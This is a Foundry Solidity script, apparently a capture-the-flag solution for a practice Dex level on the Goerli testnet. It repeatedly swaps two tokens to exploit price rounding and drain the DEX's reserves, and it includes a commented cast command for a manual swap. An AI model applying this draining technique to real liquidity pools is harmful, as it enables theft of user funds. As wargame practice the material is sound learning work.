// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Dex.sol";

contract DexHackScript is Script {
  Dex public dexContract = Dex(payable(address(0xe17DD7ad334A7F8be68381ECfF72Ec998356D043)));
  SwappableToken public token1Contract = SwappableToken(payable(address(0x4CC5E43b055d6177f942A7351bb29B547FEc06c9)));
  SwappableToken public token2Contract = SwappableToken(payable(address(0x6e5c4E0A1ccb024162c090701556f9c91A8797ad)));

  function setUp() public {}

  function run() public {
    uint256 attacker = vm.envUint("PRIVATE_KEY");
    address attackerAddress = 0x359bfB5160946a55f03c080c2DC6975C8F970d5C;
    vm.startBroadcast(attacker);
    uint256 i = 0;
    // Use helper they added to approve both tokens for more than we need
    dexContract.approve(address(dexContract), 1000);
    // While still not 0
    while (i < 5) {
      // Forgot to put this back so only automated 5 loops, did one manual from command line w/ :
    //cast send --private-key $PRIVATE_KEY --rpc-url $GOERLI_RPC_URL 0xe17DD7ad334A7F8be68381ECfF72Ec998356D043 "swap(
    //address,address,uint)" "0x4CC5E43b055d6177f942A7351bb29B547FEc06c9" "0x6e5c4E0A1ccb024162c090701556f9c91A8797ad" "45"
    // To drain it

    // while (dexContract.balanceOf(address(token1Contract), address(dexContract)) > 0 && dexContract.balanceOf(address(token2Contract), address(dexContract)) > 0) {
      // If we have move token1 then dex, empty it
      if(dexContract.balanceOf(address(token1Contract), attackerAddress) > dexContract.balanceOf(address(token1Contract), address(dexContract))) {
        console.log('first');
        dexContract.swap(address(token2Contract), address(token1Contract), dexContract.balanceOf(address(token1Contract), address(dexContract)));
      }
      // If we have move token2 then dex, empty it
      if(dexContract.balanceOf(address(token2Contract), attackerAddress) > dexContract.balanceOf(address(token2Contract), address(dexContract))) {
        console.log('second');
        dexContract.swap(address(token2Contract), address(token1Contract), dexContract.balanceOf(address(token2Contract), address(dexContract)));      }

      // Else just swap back and forth our larger balance
      // if(dexContract.balanceOf(address(token2Contract), attackerAddress) > dexContract.balanceOf(address(token2Contract), attackerAddress)) {
      if(i % 2 == 0) {
        console.log('third');
        // swap all token2 for token1
        dexContract.swap(address(token2Contract), address(token1Contract), dexContract.balanceOf(address(token2Contract), attackerAddress));
      } else {
        console.log('fourth');
        // swap all token1 for token2
        dexContract.swap(address(token1Contract), address(token2Contract), dexContract.balanceOf(address(token1Contract), attackerAddress));
      }

      i++;
    }
    console.log('we done');

    vm.stopBroadcast();
  }
}